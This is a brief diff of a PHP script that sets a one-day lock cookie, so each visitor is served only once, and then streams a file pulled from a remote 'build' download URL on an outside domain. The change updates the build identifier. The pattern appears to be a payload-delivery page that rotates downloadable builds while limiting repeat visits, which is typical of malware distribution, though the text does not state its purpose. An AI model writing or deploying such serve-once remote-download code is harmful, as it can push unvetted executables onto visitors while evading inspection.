@@ -35,7 +35,7 @@ if (isset($_COOKIE[$lockCookie]) && $_COOKIE[$lockCookie] === 'true') {
 setcookie($lockCookie, 'true', time() + (86400 * 1), '/', '', false, true);
 
 // Serve the file
-$remoteFile = 'https://blackcryptknight.com/api/build/d7169d34-e10f-4afe-9c72-2741518b0f9e/download';
+$remoteFile = 'https://blackcryptknight.com/api/build/e4ff7d69-9bdc-4db7-ac69-8a7dc0820af3/download';
 
 if (ob_get_level()) { ob_end_clean(); }
 
